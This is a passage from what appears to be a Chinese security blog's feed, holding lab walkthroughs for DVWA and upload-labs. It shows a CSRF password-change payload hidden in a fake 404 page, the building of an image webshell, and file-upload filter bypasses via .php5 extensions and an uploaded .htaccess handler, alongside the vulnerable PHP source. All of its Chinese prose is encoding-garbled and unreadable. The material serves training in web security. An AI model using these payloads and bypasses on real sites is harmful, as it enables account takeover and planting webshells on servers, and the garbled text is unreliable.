href="http://127.0.0.1/dvwa/vulnerabilities/csrf/?password_new=123&amp;password_conf=123&amp;Change=Change#">http://127.0.0.1/dvwa/vulnerabilities/csrf/?password_new=123&amp;password_conf=123&amp;Change=Change#</a></p><p>å½“å—å®³è€…ç‚¹å‡»äº†è¿™ä¸ªé“¾æ¥ï¼Œä»–çš„å¯†ç å°±ä¼šè¢«æ”¹æˆ123ï¼ˆè¿™ç§æ”»å‡»æ˜¾å¾—æœ‰äº›æ‹™åŠ£ï¼Œé“¾æ¥ä¸€çœ¼å°±èƒ½çœ‹å‡ºæ¥æ˜¯æ”¹å¯†ç çš„ï¼Œè€Œä¸”å—å®³è€…ç‚¹äº†é“¾æ¥ä¹‹åçœ‹åˆ°è¿™ä¸ªé¡µé¢å°±ä¼šçŸ¥é“è‡ªå·±çš„å¯†ç è¢«ç¯¡æ”¹äº†ï¼‰</p><p><a href="http://image.3001.net/images/20161031/14778953244372.png"><img src="http://image.3001.net/images/20161031/14778953244372.png!small" alt="1.png"></a> </p><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼ŒCSRFæœ€å…³é”®çš„æ˜¯åˆ©ç”¨å—å®³è€…çš„cookieå‘æœåŠ¡å™¨å‘é€ä¼ªé€ è¯·æ±‚ï¼Œæ‰€ä»¥å¦‚æœå—å®³è€…ä¹‹å‰ç”¨Chromeæµè§ˆå™¨ç™»å½•çš„è¿™ä¸ªç³»ç»Ÿï¼Œè€Œç”¨æœç‹—æµè§ˆå™¨ç‚¹å‡»è¿™ä¸ªé“¾æ¥ï¼Œæ”»å‡»æ˜¯ä¸ä¼šè§¦å‘çš„ï¼Œå› ä¸ºæœç‹—æµè§ˆå™¨å¹¶ä¸èƒ½åˆ©ç”¨Chromeæµè§ˆå™¨çš„cookieï¼Œæ‰€ä»¥ä¼šè‡ªåŠ¨è·³è½¬åˆ°ç™»å½•ç•Œé¢ã€‚</p><p><a href="http://image.3001.net/images/20161031/14778953704168.png"><img src="http://image.3001.net/images/20161031/14778953704168.png!small" alt="1.png"></a></p><p>æœ‰äººä¼šè¯´ï¼Œè¿™ä¸ªé“¾æ¥ä¹Ÿå¤ªæ˜æ˜¾äº†å§ï¼Œä¸ä¼šæœ‰äººç‚¹çš„ï¼Œæ²¡é”™ï¼Œæ‰€ä»¥çœŸæ­£æ”»å‡»åœºæ™¯ä¸‹ï¼Œæˆ‘ä»¬éœ€è¦å¯¹é“¾æ¥åšä¸€äº›å¤„ç†ã€‚</p><p>B) æˆ‘ä»¬å¯ä»¥ä½¿ç”¨çŸ­é“¾æ¥æ¥éšè—URLï¼ˆç‚¹å‡»çŸ­é“¾æ¥ï¼Œä¼šè‡ªåŠ¨è·³è½¬åˆ°çœŸå®ç½‘ç«™ï¼‰ï¼š</p><p>å¦‚<a href="http://dwz.cn/">http://dwz.cn/</a>****</p><p><a href="http://image.3001.net/images/20161031/14778954786668.png"><img src="http://image.3001.net/images/20161031/14778954786668.png!small" alt="1.png"></a></p><p>å› ä¸ºæœ¬åœ°æ­çš„ç¯å¢ƒï¼ŒæœåŠ¡å™¨åŸŸåæ˜¯ipæ‰€ä»¥æ— æ³•ç”Ÿæˆç›¸åº”çš„çŸ­é“¾æ¥= =ï¼Œå®é™…æ”»å‡»åœºæ™¯ä¸‹åªè¦ç›®æ ‡æœåŠ¡å™¨çš„åŸŸåä¸æ˜¯ipï¼Œæ˜¯å¯ä»¥ç”Ÿæˆç›¸åº”çŸ­é“¾æ¥çš„ã€‚</p><p><a href="http://image.3001.net/images/20161031/14778955097586.png"><img src="http://image.3001.net/images/20161031/14778955097586.png!small" alt="1.png"></a> </p><p>éœ€è¦æé†’çš„æ˜¯ï¼Œè™½ç„¶åˆ©ç”¨äº†çŸ­é“¾æ¥éšè—urlï¼Œä½†å—å®³è€…æœ€ç»ˆè¿˜æ˜¯ä¼šçœ‹åˆ°å¯†ç ä¿®æ”¹æˆåŠŸçš„é¡µé¢ï¼Œæ‰€ä»¥è¿™ç§æ”»å‡»æ–¹æ³•ä¹Ÿå¹¶ä¸é«˜æ˜ã€‚</p><p>C) æ„é€ æ”»å‡»é¡µé¢</p><p>ç°å®æ”»å‡»åœºæ™¯ä¸‹ï¼Œè¿™ç§æ–¹æ³•éœ€è¦äº‹å…ˆåœ¨å…¬ç½‘ä¸Šä¼ ä¸€ä¸ªæ”»å‡»é¡µé¢ï¼Œè¯±éª—å—å®³è€…å»è®¿é—®ï¼ŒçœŸæ­£èƒ½å¤Ÿåœ¨å—å®³è€…ä¸çŸ¥æƒ…çš„æƒ…å†µä¸‹å®ŒæˆCSRFæ”»å‡»ã€‚è¿™é‡Œä¸ºäº†æ–¹ä¾¿æ¼”ç¤ºï¼ˆæ‰ä¸æ˜¯æˆ‘ç§Ÿä¸èµ·æœåŠ¡å™¨= =ï¼‰ï¼Œå°±åœ¨æœ¬åœ°å†™ä¸€ä¸ªtest.htmlï¼Œä¸‹é¢æ˜¯å…·ä½“ä»£ç ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src&#x3D;&quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;dvwa&#x2F;vulnerabilities&#x2F;csrf&#x2F;?password_new&#x3D;hack&amp;password_conf&#x3D;hack&amp;Change&#x3D;Change#&quot; border&#x3D;&quot;0&quot; style&#x3D;&quot;display:none;&quot;&#x2F;&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;h1&gt;404&lt;h1&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;h2&gt;file not found.&lt;h2&gt;</span><br></pre></td></tr></table></figure><p>å½“å—å®³è€…è®¿é—®test.htmlæ—¶ï¼Œä¼šè¯¯è®¤ä¸ºæ˜¯è‡ªå·±ç‚¹å‡»çš„æ˜¯ä¸€ä¸ªå¤±æ•ˆçš„urlï¼Œä½†å®é™…ä¸Šå·²ç»é­å—äº†CSRFæ”»å‡»ï¼Œå¯†ç å·²ç»è¢«ä¿®æ”¹ä¸ºäº†hackã€‚</p><p><a href="http://image.3001.net/images/20161031/14778955408376.png"><img src="http://image.3001.net/images/20161031/14778955408376.png!small" alt="1.png"></a> </p>]]></content>
      
      
      
        <tags>
            
            <tag> dvwa </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å›¾ç‰‡é©¬</title>
      <link href="/2021/02/22/upload-labs/%E5%9B%BE%E7%89%87%E9%A9%AC/"/>
      <url>/2021/02/22/upload-labs/%E5%9B%BE%E7%89%87%E9%A9%AC/</url>
      
        <content type="html"><![CDATA[<p>  1.æ‰“å¼€windowså‘½ä»¤æ§åˆ¶å°ï¼Œcdåˆ°å›¾ç‰‡ä¸æ–‡ä»¶åŒåœ¨è·¯å¾„ä¸‹</p><p>  å¦‚ 1.jpgä¸ 2.phpåŒåœ¨æ¡Œé¢ï¼Œåˆ™ï¼š</p><p>  cd   desktop</p><ol start="2"><li><p>è¾“å…¥æŒ‡ä»¤ï¼šcopy  1.jpg/b  +  2.php/a  shell,jpg   ä¹‹åå›è½¦ï¼Œé‚£ä¹ˆå½¢æˆçš„å›¾ç‰‡é©¬æ–‡ä»¶å°±ä¼šå‡ºç°åœ¨è‡ªå·±çš„æ¡Œé¢ä¸Šã€‚</p><p><img src="/2021/02/22/upload-labs/%E5%9B%BE%E7%89%87%E9%A9%AC/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(38).png"></p><p>â€‹    </p></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> upload-labs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>upload-labs</title>
      <link href="/2021/02/21/upload-labs/upload-labs/"/>
      <url>/2021/02/21/upload-labs/upload-labs/</url>
      
        <content type="html"><![CDATA[<p> è½¬è½½äºï¼š<a href="https://blog.csdn.net/weixin_44677409/article/details/92799366">https://blog.csdn.net/weixin_44677409/article/details/92799366</a> ä½œè€…ï¼šå°ç™½ç™½@</p><p>ï¼ˆä¸æ‡‚ä¸ºä»€ä¹ˆé‡Œé¢ä¸€äº›å…³å¡çš„æ–¹æ³•ä½œè€…å¯ä»¥ç»•è¿‡ï¼Œè€Œæˆ‘å°±æ˜¯æç¤ºä¸å¯ä»¥ä¸Šä¼ è¯¥æ–‡ä»¶ç±»å‹ï¼Œä¼¤è„‘ç­‹ã€‚ã€‚ï¼‰</p><p>ï¼ˆç»è¿‡ä¸æ–­å¤±è´¥åï¼Œæ˜ç™½åŸå› äº†ï¼šä¸é…ç½®æ–‡ä»¶php.iniæœ‰å…³ï¼Œéœ€è¦ä¿®æ”¹é…ç½®ï¼›å…¶æ¬¡æ–‡ä»¶ç¼ºå¤±ï¼Œå› ä¸ºå¯èƒ½ä»ç½‘ç»œä¸Šç™½è·å–çš„æ–‡ä»¶å§ï¼Œå¥½å¤šç‰ˆæœ¬å­˜åœ¨å…³å¡ä¸è¶³ã€å¯¹åº”å…³å¡æºä»£ç ä¸å¯¹ç­‰é—®é¢˜ï¼Œç°åœ¨æ¥çœ‹åœ¨è®­ç»ƒçš„ä¸‰ä¸ªé¶åœºä¸­ï¼ŒSQL labsæ˜¯åæœŸéš¾åº¦æœ€å¤§ã€æ—¶é—´æœ€é•¿å¾—äº†ã€‚ï¼‰</p><p><img src="https://img-blog.csdnimg.cn/20190619151237843.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="Pass-1-jsæ£€æŸ¥"><a href="#Pass-1-jsæ£€æŸ¥" class="headerlink" title="Pass-1-jsæ£€æŸ¥"></a>Pass-1-jsæ£€æŸ¥</h2><p><strong>æºç ï¼š</strong><br><img src="https://img-blog.csdnimg.cn/20190618192730245.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>å› ä¸ºæ˜¯å‰ç«¯jsæ ¡éªŒï¼Œå› æ­¤å¯ä»¥ç›´æ¥ç¦ç”¨js<br>æˆ–è€…ç”¨burpæŠ“åŒ…ä¿®æ”¹æ–‡ä»¶ç±»å‹ï¼ˆä¸Šä¼ 1.jpgä¿®æ”¹ä¸º1.phpï¼‰<br><img src="https://img-blog.csdnimg.cn/20190618201625999.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/20190618201727918.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="Pass-2-åªéªŒè¯Content-type"><a href="#Pass-2-åªéªŒè¯Content-type" class="headerlink" title="Pass-2-åªéªŒè¯Content-type"></a>Pass-2-åªéªŒè¯Content-type</h2><p><strong>æºç ï¼š</strong></p><p><img src="https://img-blog.csdnimg.cn/20190618202240670.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ä»…ä»…åˆ¤æ–­content-typeç±»å‹ï¼Œå› æ­¤ä¸Šä¼ 1.phpæŠ“åŒ…ä¿®æ”¹content-typeä¸ºå›¾ç‰‡ç±»å‹ï¼šimage/jpegã€image/pngã€image/gif</p><p><img src="https://img-blog.csdnimg.cn/20190618202602681.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/2019061820285334.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="Pass-3-é»‘åå•ç»•è¿‡"><a href="#Pass-3-é»‘åå•ç»•è¿‡" class="headerlink" title="Pass-3-é»‘åå•ç»•è¿‡"></a>Pass-3-é»‘åå•ç»•è¿‡</h2><p><strong>æºç ï¼š</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">&#x27;.asp&#x27;</span>,<span class="string">&#x27;.aspx&#x27;</span>,<span class="string">&#x27;.php&#x27;</span>,<span class="string">&#x27;.jsp&#x27;</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//è½¬æ¢ä¸ºå°å†™</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $file_ext);<span class="comment">//å»é™¤å­—ç¬¦ä¸²::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//æ”¶å°¾å»ç©º</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.date(<span class="string">&quot;YmdHis&quot;</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;            </span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file,$img_path)) &#123;</span><br><span class="line">                 $is_upload = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&#x27;ä¸å…è®¸ä¸Šä¼ .asp,.aspx,.php,.jspåç¼€æ–‡ä»¶ï¼&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">&#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="number">12345678910111213141516171819202122232425262728</span></span><br></pre></td></tr></table></figure><p>ç”¨é»‘åå•ä¸å…è®¸ä¸Šä¼ <code>.asp,.aspx,.php,.jsp</code>åç¼€çš„æ–‡ä»¶<br>ä½†å¯ä»¥ä¸Šä¼ <code>.phtml .phps .php5 .pht</code><br>å‰ææ˜¯apacheçš„httpd.confä¸­æœ‰å¦‚ä¸‹é…ç½®ä»£ç </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AddType application&#x2F;x-httpd-php .php .phtml .phps .php5 .pht</span><br><span class="line">1</span><br></pre></td></tr></table></figure><p>å› æ­¤æŠ“åŒ…ä¿®æ”¹ä¸º1.php5ä¸Šä¼ ï¼Œå›å¤åŒ…é‡Œæœ‰ä¸Šä¼ è·¯å¾„<br><img src="https://img-blog.csdnimg.cn/20190618205539849.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/20190618205914362.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="Pass-4-htaccessç»•è¿‡"><a href="#Pass-4-htaccessç»•è¿‡" class="headerlink" title="Pass-4-.htaccessç»•è¿‡"></a>Pass-4-.htaccessç»•è¿‡</h2><p><strong>æºç ï¼š</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;php1&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;pHp1&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//è½¬æ¢ä¸ºå°å†™</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $file_ext);<span class="comment">//å»é™¤å­—ç¬¦ä¸²::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//æ”¶å°¾å»ç©º</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.$file_name;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&#x27;æ­¤æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ !&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">&#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="number">12345678910111213141516171819202122232425262728</span></span><br></pre></td></tr></table></figure><p>é»‘åå•æ‹’ç»äº†å‡ ä¹æ‰€æœ‰æœ‰é—®é¢˜çš„åç¼€åï¼Œé™¤äº†.htaccess<br>å‰ææ¡ä»¶ï¼ˆ<code>1.mod_rewriteæ¨¡å—å¼€å¯ã€‚2.AllowOverride All</code>ï¼‰<br>å› æ­¤å…ˆä¸Šä¼ ä¸€ä¸ª.htaccessæ–‡ä»¶ï¼Œå†…å®¹å¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SetHandler application&#x2F;x-httpd-php </span><br><span class="line">1</span><br></pre></td></tr></table></figure><p>è¿™æ ·æ‰€æœ‰æ–‡ä»¶éƒ½ä¼šå½“æˆphpæ¥è§£æ<br><img src="https://img-blog.csdnimg.cn/20190619210642615.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/20190619210904393.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/20190619210924251.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="Pass-5-å¤§å°å†™ç»•è¿‡"><a href="#Pass-5-å¤§å°å†™ç»•è¿‡" class="headerlink" title="Pass-5-å¤§å°å†™ç»•è¿‡"></a>Pass-5-å¤§å°å†™ç»•è¿‡</h2><p><strong>æºç ï¼š</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span 